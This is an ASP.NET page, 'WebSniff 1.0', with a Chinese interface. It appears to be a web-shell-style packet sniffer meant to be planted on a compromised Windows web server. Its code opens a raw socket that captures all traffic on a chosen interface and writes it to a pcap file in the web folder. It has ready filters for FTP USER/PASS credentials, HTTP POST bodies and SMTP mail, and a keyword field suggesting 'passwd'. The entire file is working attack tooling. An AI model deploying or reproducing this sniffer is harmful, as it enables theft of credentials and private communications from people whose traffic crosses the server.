<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Threading" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<title>WebSniff 1.0  Powered by  上善若水 汉化版 </title>
</head>
<body>

<script runat="server">

    static private Socket mainSocket;                          //The socket which captures all incoming packets
    private static byte[] byteData = new byte[2048];
    private static bool bContinueCapturing = true;            //A flag to check if packets are to be captured or not
    static int stoppackes = 0;
    static int port = 0;
    static string strIP = null;
    static long packets = 0;
    static System.IO.FileStream wfs;
    static string logfile =null;
    static PacketCaptureWriter pktwt;
    static string keyword;
    static DateTime stoptime = System.DateTime.Now.AddYears(-8);
    static Thread th;
    static int minisizepacket=0;
    static string proException = null;

    static Boolean logNextPacket = false;
    static Boolean my_s_ftp= true;
    static Boolean my_s_http_post = false;
    static Boolean my_s_smtp = false;


    
    protected void Page_Load(object sender, EventArgs e)
    {

        if (logfile == null)
        {
            logfile = Server.MapPath("w" + System.DateTime.Now.ToFileTime() + ".txt");
        }
        if (stoptime.Year == (System.DateTime.Now.Year - 8))
        {
            System.DateTime nextDay = System.DateTime.Now.AddDays(1);
            stoptime = nextDay;
        }
        
        //没有生成IP列表
        if (ddlist.Items.Count==0)
        {
            IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));
            if (HosyEntry.AddressList.Length > 0)
            {
                foreach (IPAddress ip in HosyEntry.AddressList)
                {
                    ddlist.Items.Add(ip.ToString());
                }
            }
        }



        //如不是点击Starts按钮，则打印已经设过的参数
        if (Request.Form["Starts"] == null)
        {
            this.ddlist.SelectedValue = strIP;
            this.txtport.Text = port.ToString();
            this.txtMinisize.Text = minisizepacket.ToString();
            this.txtkeywords.Text = keyword;
            this.txtlogfile.Text = logfile;
            this.txtpackets.Text = stoptime.ToString();
            this.s_ftp.Checked = my_s_ftp;
            this.s_http_post.Checked = my_s_http_post;
            this.s_smtp.Checked = my_s_smtp;
        }

        if (th != null )
        {
            this.Lb_msg.Text = System.DateTime.Now.ToString()+"  State: <b>" + th.ThreadState.ToString() +"</b>  Packets: "+packets.ToString();
        }
        else
        {
            this.Lb_msg.Text = "嗅探还没有开始额";
        }
        
        

        if (Request.Form["Starts"] != null || th != null)
        {
            this.Starts.Enabled = false;
        }
        else
        {
            this.Starts.Enabled = true;
        }
        //点击了stop按钮
        if (Request.Form["Button1"] != null)
        {
            this.Starts.Enabled = true;
            this.Lb_msg.Text = System.DateTime.Now.ToString() + "  State: <b>stoping. Click \"Refresh\" again to see if thread is stoped successed.</b>  Packets: " + packets.ToString();
        }

        Lb_msg2.Text = proException; //错误信息
    }

    protected void Refresh_Click(object sender, EventArgs e)
    {

    }

    protected void Stop_Click(object sender, EventArgs e)
    {
        packets = stoppackes;
        //stoptime = System.DateTime.Now;
        proException += "<br>last time stop at " + System.DateTime.Now.ToString();
        bContinueCapturing = false;
      
        
        if (th != null)
        {
            th.Abort();
            th = null; 
        }
        try
        {
            wfs.Close();
            mainSocket.Close();
        }
        catch (Exception ex)
        {
        }
    }
    protected void Pagestart()
    {
        //记录设置过的参数
        strIP = ddlist.SelectedValue;
        port = Int32.Parse(txtport.Text);
        stoptime = Convert.ToDateTime( txtpackets.Text);
        logfile = this.txtlogfile.Text;
        keyword = txtkeywords.Text;
        minisizepacket = Int32.Parse(txtMinisize.Text);
        my_s_ftp = this.s_ftp.Checked;
        my_s_http_post = this.s_http_post.Checked;
        my_s_smtp = this.s_smtp.Checked;
        
        wfs = System.IO.File.Create(logfile);
        pktwt = new PacketCaptureWriter(wfs, LinkLayerType.RawIP);
        bContinueCapturing = true;
        packets = 0;
        
        Start();
    }
    private static void Start()
    {
        byte[] byTrue = new byte[4] { 1, 0, 0, 0 };
        byte[] byOut = new byte[4] { 1, 0, 0, 0 };
        try
        {
            bContinueCapturing = true;
            mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            mainSocket.Bind(new IPEndPoint(IPAddress.Parse(strIP), 0));
            mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            mainSocket.IOControl(IOControlCode.ReceiveAll, byTrue, byOut);
        }
        catch (Exception ex)
        {
            proException += ex.ToString()+"<BR>"; //静态方法可以访问静态变量proException
        }
        byteData = new byte[2048];
 
        while (System.DateTime.Now <= stoptime)
        {
            ParseData(byteData, mainSocket.Receive(byteData));
        }
        bContinueCapturing = false;
        wfs.Close();
        mainSocket.Close();
    }
 
    protected void Start_Click(object sender, EventArgs e)
    {

        if (this.txtlogfile.Text == "" || txtpackets.Text.Length < 1 || txtport.Text == "") return;
        th = new Thread(new ThreadStart(Pagestart));
        th.Start();
        //Session["workthread"] = th;
        this.Lb_msg.Text = "\r\nSniffing.Click \"Refresh\" to see the lastest status.";
    }

    public static ushort Get2Bytes(byte[] ptr, int Index, int Type)
    {
        ushort u = 0;

        if (Type == 0)
        {
            u = (ushort)ptr[Index++];
            u *= 256;
            u += (ushort)ptr[Index++];
        }
        else if (Type == 1)
        {
            u = (ushort)ptr[++Index];
            u *= 256; Index--;
            u += (ushort)ptr[Index++]; Index++;
        }

        return u;
    }


    private static void ParseData(byte[] byteData, int nReceived)
    {
        try
        {
            byte[] nbyte = new byte[nReceived];
            Array.Copy(byteData, nbyte, nReceived);
            if ((int)nbyte[9] == 6)
            {
               
                int sport = Get2Bytes(nbyte,  20,0);
                int dport = Get2Bytes(nbyte,  22,0);
                
                String datas=Encoding.Default.GetString(nbyte);
                Boolean logIt=false;
                

                if (my_s_ftp)
                {
                    if ((sport == 21 || dport == 21) &&
                        (datas.IndexOf("USER ") >= 0 || datas.IndexOf("PASS ") >= 0)
                        )
                    {
                       logIt =true;                    
                    }
                }

                if (!logIt && my_s_http_post)
                {
                    if(logNextPacket){
                        logIt =true; 
                        logNextPacket=false;
                        
                    }
                    if (!logIt && datas.IndexOf("POST ")>=0)
                    {
                       logIt =true; 
                       logNextPacket=true;
                    }
                    
                }

                if (!logIt && my_s_smtp && (dport == 25 || sport == 25))
                {
                     logIt =true; 
                }

                
                //判断端口
                if (!logIt && (dport == port || sport == port))
                {
                    if (nReceived > minisizepacket)
                    {

                        //判断关键字
                        if (keyword != "")
                        {
                            if (datas.IndexOf(keyword) >= 0)
                            {
                                logIt =true; 
                            }

                        }
                        else
                        {
                            logIt =true; 
                        }

                    }
                }
                if(logIt){
                         PacketCapture pkt = new PacketCapture(nbyte, nReceived);
                            pktwt.Write(pkt);
                            packets++;
                }
                
                
            }
        }
        catch { }

    }
    public struct UnixTime
    {
        public static readonly DateTime MinDateTime = new DateTime(1970, 1, 1, 0, 0, 0);
        public static readonly DateTime MaxDateTime = new DateTime(2038, 1, 19, 3, 14, 7);

        private readonly int _Value;

        public UnixTime(int value)
        {
            if (value < 0)
                throw new ArgumentOutOfRangeException("value");
            _Value = value;
        }

        public int Value
        {
            get { return _Value; }
        }

        public DateTime ToDateTime()
        {
            const long START = 621355968000000000; // 1970-1-1 00:00:00
            return new DateTime(START + (_Value * (long)10000000)).ToLocalTime();
        }

        public static UnixTime FromDateTime(DateTime dateTime)
        {
            if (dateTime < MinDateTime || dateTime > MaxDateTime)
                throw new ArgumentOutOfRangeException("dateTime");
            TimeSpan span = dateTime.Subtract(MinDateTime);
            return new UnixTime((int)span.TotalSeconds);
        }

        public override string ToString()
        {
            return ToDateTime().ToString();
        }

    }
    public enum LinkLayerType : uint
    {
        Null = 0,
        Ethernet = 1,
        RawIP = 101,
        User0 = 147,
        User1 = 148,
        User2 = 149,
        User3 = 150,
        User4 = 151,
        User5 = 152,
        User6 = 153,
        User7 = 154,
        User8 = 155,
        User9 = 156,
        User10 = 157,
        User11 = 158,
        User12 = 159,
        User13 = 160,
        User14 = 161,
        User15 = 162,

    }


    public sealed class PacketCaptureWriter
    {
        #region Fields
        private const uint MAGIC = 0xA1B2C3D4;
        private readonly Stream _BaseStream;
        private readonly LinkLayerType _LinkLayerType;
        private readonly int _MaxPacketLength;
        private readonly BinaryWriter m_Writer;
        private bool m_ExistHeader = false;
        private int _TimeZone;
        private int _CaptureTimestamp;

        #endregion

        #region Constructors

        public PacketCaptureWriter(
            Stream baseStream, LinkLayerType linkLayerType,
            int maxPacketLength, int captureTimestamp)
        {
            if (baseStream == null) throw new ArgumentNullException("baseStream");
            if (maxPacketLength < 0) throw new ArgumentOutOfRangeException("maxPacketLength");
            if (!baseStream.CanWrite) throw new ArgumentException("Cant'Wirte Stream");
            _BaseStream = baseStream;
            _LinkLayerType = linkLayerType;
            _MaxPacketLength = maxPacketLength;
            _CaptureTimestamp = captureTimestamp;
            m_Writer = new BinaryWriter(_BaseStream);
        }


        public PacketCaptureWriter(Stream baseStream, LinkLayerType linkLayerType, int captureTimestamp)
            : this(baseStream, linkLayerType, 0xFFFF, captureTimestamp)
        {
        }

        public PacketCaptureWriter(Stream baseStream, LinkLayerType linkLayerType)
            : this(baseStream, linkLayerType, 0xFFFF, UnixTime.FromDateTime(DateTime.Now).Value)
        {
        }

        #endregion

        #region Properties

        public short VersionMajor
        {
            get { return 2; }
        }

        public short VersionMinjor
        {
            get { return 4; }
        }


        public int TimeZone
        {
            get { return _TimeZone; }
            set { _TimeZone = value; }
        }


        public int CaptureTimestamp
        {
            get { return _CaptureTimestamp; }
            set { _CaptureTimestamp = value; }
        }


        public Stream BaseStream
        {
            get { return _BaseStream; }
        }

        public LinkLayerType LinkLaterType
        {
            get { return _LinkLayerType; }
        }

        public int MaxPacketLength
        {
            get { return _MaxPacketLength; }
        }

        #endregion


        public void Write(PacketCapture packet)
        {
            CheckHeader();
            m_Writer.Write(packet.Timestamp.Value);
            m_Writer.Write(packet.Millseconds);
            m_Writer.Write(packet.Packet.Count);
            m_Writer.Write(packet.RawLength);
            m_Writer.Write(packet.Packet.Array, packet.Packet.Offset, packet.Packet.Count);
        }


        public void Flush()
        {
            BaseStream.Flush();
        }

        private void CheckHeader()
        {
            if (!m_ExistHeader)
            {
                m_Writer.Write(MAGIC);
                m_Writer.Write(VersionMajor);
                m_Writer.Write(VersionMinjor);
                m_Writer.Write(TimeZone);
                m_Writer.Write(CaptureTimestamp);
                m_Writer.Write(MaxPacketLength);
                m_Writer.Write((uint)LinkLaterType);
                m_ExistHeader = true;
            }
        }

    }

    public sealed class PacketCapture
    {
        private readonly UnixTime _Timestamp;
        private readonly ArraySegment<byte> _Packet;
        private readonly int _RawLength;
        private readonly int _Millseconds;

  
        public PacketCapture(ArraySegment<byte> packet, int rawLength, UnixTime timestamp, int millseconds)
        {
            if (packet.Count > rawLength)
                throw new ArgumentException("Length Error", "rawLength");
            _Packet = packet;
            _Timestamp = timestamp;
            _RawLength = rawLength;
            _Millseconds = millseconds;
        }

        public PacketCapture(ArraySegment<byte> packet, int rawLength, DateTime timestamp)
            : this(packet, rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }

        public PacketCapture(ArraySegment<byte> packet, int rawLength)
            : this(packet, rawLength, UnixTime.FromDateTime(DateTime.Today), 0)
        {
        }

        public PacketCapture(ArraySegment<byte> packet)
            : this(packet, packet.Count)
        {
        }
        public PacketCapture(byte[] packetData, int offset, int count, int rawLength, UnixTime timestamp, int millseconds)
            : this(new ArraySegment<byte>(packetData, offset, count), rawLength, timestamp, millseconds)
        {
        }
        public PacketCapture(byte[] packetData, int offset, int count, int rawLength, DateTime timestamp)
            : this(new ArraySegment<byte>(packetData, offset, count), rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }
        public PacketCapture(byte[] packetData, int rawLength, UnixTime timestamp, int millseconds)
            : this(new ArraySegment<byte>(packetData), rawLength, timestamp, millseconds)
        {
        }
        public PacketCapture(byte[] packetData, int rawLength, DateTime timestamp)
            : this(new ArraySegment<byte>(packetData), rawLength, UnixTime.FromDateTime(timestamp), 0)
        {
        }

        public PacketCapture(byte[] packetData, int rawLength)
            : this(new ArraySegment<byte>(packetData), rawLength, UnixTime.FromDateTime(DateTime.Today), 0)
        {
        }
        public PacketCapture(byte[] packetData)
            : this(packetData, packetData.Length)
        {
        }

        public ArraySegment<byte> Packet
        {
            get { return _Packet; }
        }
        public UnixTime Timestamp
        {
            get { return _Timestamp; }
        }
        public int Millseconds
        {
            get { return _Millseconds; }
        }

        public int RawLength
        {
            get { return _RawLength; }
        }

    }
</script>



<style type="text/css">
<!--
a {
color: #FF0000	 ;text-decoration: none
}
#b 
{
color: #336699;
font-size: 10pt;
text-align: right;
}
#tt 
{
vertical-align: middle;
font-size: 12pt;
text-align: center;
}

#Ct_2 
{
padding-left:30px;
font-size: 10pt;
color: #336699;
vertical-align: middle;
text-align: left;
background-color: aliceblue;
border-width: 1px;
border-style: solid;
border-color: -moz-use-text-color;
padding-bottom:10px;
}
-->
</style>
<form id="form1" runat="server">
<div id="tt">  <b> WebSniff 1.0</b><br /><br />  </div>
<div id="Ct_2" >
    <table width="100%" >
      <tr >
            <td  width="10%"> 目标IP: </td>
            <td ><asp:DropDownList ID="ddlist" runat="server" width="90%"></asp:DropDownList></td>
        </tr>
        
      <tr >
            <td  width="10%">自动嗅探: </td>
            <td >
            FTP 密码:
             <asp:CheckBox ID="s_ftp" runat="server" Checked />
             &nbsp;&nbsp;
             
             HTTP Post Data:
              <asp:CheckBox ID="s_http_post" runat="server" />
              &nbsp;&nbsp;
              
              Smtp Data:
               <asp:CheckBox ID="s_smtp" runat="server" />
            
            
            </td>
        </tr>
                   
        
        
        <tr>
            <td ">
                目标端口:
            </td>
            <td>
                <asp:TextBox ID="txtport" Text="0"  width="90%" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                数据包大小:
            </td>
            <td >
                <asp:TextBox ID="txtMinisize" Text="0"  width="90%" runat="server" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td>
                关键字如（passwd):
            </td>
            <td>
                <asp:TextBox ID="txtkeywords" runat="server"   width="90%" Text=""></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                数据包文件存放位置:
            </td>
            <td>
                <asp:TextBox ID="txtlogfile" runat="server"   width="90%" Text="log.log" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                定时停止:
            </td>
            <td>
                <asp:TextBox ID="txtpackets" runat="server"  width="90%" Text="300"></asp:TextBox>
            </td>
        </tr>
	     <tr>
            <td >
            	      控制:
            </td>
            <td   width="90%" >	 <asp:Button ID="Starts" runat="server" OnClick="Start_Click" Text="开始" />
			      <asp:Button ID="Button1" runat="server" OnClick="Stop_Click" Text="停止" />
                  <asp:Button ID="Button_ref" runat="server" OnClick="Refresh_Click" Text="保存" /><br />
            </td>
        </tr>
	     <tr>
            <td  >
            	      Status:
            </td>
            <td   width="90%"><div id="s"><asp:Label ID="Lb_msg" runat="server" Text=""></div></asp:Label>
            </td>
        </tr>

	     <tr>
            <td  >
                	  
            </td>
            <td   width="90%"><div id="s"><asp:Label ID="Lb_msg2" runat="server" Text=""></div></asp:Label>
            </td>
        </tr>
        


    </table>
    </div><br /><br />
    <div id=b>Powered by <a href="//user.qzone.qq.com/356497021"> 上善若水 </a>|汉化
    
    <a href=" http://user.qzone.qq.com/356497021">1</a> 

    <a href="http://user.qzone.qq.com/356497021">2</a> 
    </div>
 
    
    
    
</form>
</body>
</html>
